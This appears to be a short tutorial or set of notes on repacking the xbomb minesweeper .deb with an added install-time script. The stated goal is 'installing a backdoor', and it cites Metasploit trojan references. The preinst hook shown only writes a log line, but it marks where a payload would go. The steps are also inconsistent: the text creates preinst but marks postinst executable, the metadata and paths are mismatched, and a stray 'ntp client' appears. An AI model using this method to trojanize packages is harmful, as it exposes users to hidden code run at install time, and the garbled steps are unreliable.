Refs:
* <https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/>
* <https://github.com/UndeadSec/Debinject>
* <https://fabianlee.org/2018/09/28/ubuntu-customizing-and-repacking-a-deb-file/>
* <http://www.securitytube.net/video/618>

```bash
# Download the .deb file in which you want to install the backdoor
$ sudo apt-get --download-only install xbomb

# Make a directory and copy .deb file into the newly created directory
$ mkdir /tmp/evil
$ sudo mv /var/cache/apt/archives/xbomb_2.2b-1build1_amd64.deb /tmp/evil
$ cd /tmp/evil/

# Extract the contents of .deb package into work directory
$ dpkg -x xbomb_2.2b-1build1_amd64.deb work

# MakeDEBIAN directory inside work directory
$ mkdir /tmp/evil/work/DEBIAN

# Create a control file inside the DEBIAN directory
:/tmpevil/work/DEBIAN$ cat control

cat control
Package: xbomb
Version: 2.2b-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 xbomb is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use.
```
In our DEBIAN directory, we’ll create a file named preinst that contains the following
```bash
:/tmp/evil/work/DEBIAN# cat preinst
#!/bin/sh

echo "ran preinst of ntp client at $(date)." >> /tmp/myntp.log
```
We’ll now make our pre-installation script executable and build our new package. 
The built file will be named work.deb so we will want to change that to xbomb.deb
```bash
:/tmp/evil/work/DEBIAN$ chmod 755 postinst
:/tmp/evil/work/DEBIAN$ dpkg-deb --build /tmp/evil/work
dpkg-deb: building package `xbomb' in `/tmp/evil/work.deb'.
:/tmp/evil$ mv work.deb xbomb.deb
```
Now, we can copy xbomb.deb to home folder and double click for installation

In order to uninstall the .deb file
```bash
$ sudo dpkg -P xbomb
```
